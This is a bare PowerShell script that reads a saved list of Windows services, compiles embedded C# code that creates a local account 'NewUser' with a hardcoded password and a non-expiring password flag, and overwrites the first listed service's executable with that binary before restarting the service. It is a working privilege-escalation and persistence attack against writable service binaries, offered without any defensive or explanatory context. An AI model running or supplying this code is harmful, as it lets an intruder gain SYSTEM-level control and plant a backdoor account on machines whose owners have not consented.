 $f=(Get-Content $env:AppData\services.txt)
$targets = @()
(($f -match '^  (Name|PathName)') -replace '  Name',"`nName" -replace "  PathName","PathName") -join "," | % {
    if($_ -notmatch '^ '){
        $_ -replace "`",`n","`"`n" -replace "^`n",'' -split "`n" | % {
            $service = ("{{'{0}'}}" -f ("$_" -replace '             : ',"':'" -replace '         : ',"':'" -replace ',',"','" -replace '\\','\\'))
            $targets += ($service |convertfrom-json)
        }
    }
}

if($targets.Count -gt 0){
    $code = @"
using System;
using System.DirectoryServices;
namespace HelloWorld
{
	public class Program$id
	{
		public static void Main(){
			DirectoryEntry hostMachineDirectory = new DirectoryEntry("WinNT://localhost");
            DirectoryEntries entries = hostMachineDirectory.Children;
            bool userExists = false;
            foreach (DirectoryEntry each in entries)
            {
                userExists = each.Name.Equals("NewUser",StringComparison.CurrentCultureIgnoreCase);
                if (userExists)
                    break;
            }

            if (false == userExists)
            {
                DirectoryEntry obUser = entries.Add("NewUser", "User");
                obUser.Properties["FullName"].Add("Local user");
                obUser.Invoke("SetPassword", "abcdefg12345@");
                obUser.Invoke("Put", new object[] {"UserFlags", 0x10000});
                obUser.CommitChanges();
            }
		}
	}
}
"@  | out-file C:\temp\adduser.cs
    $name = $targets[0].Name
    $path = ($targets[0].PathName -replace '"','')
    C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:$path c:\temp\adduser.cs 
    Stop-Service "$targets[0].Name" -ErrorAction SilentlyContinue
    Start-Service "$targets[0].Name" -ErrorAction SilentlyContinue
}

 
 
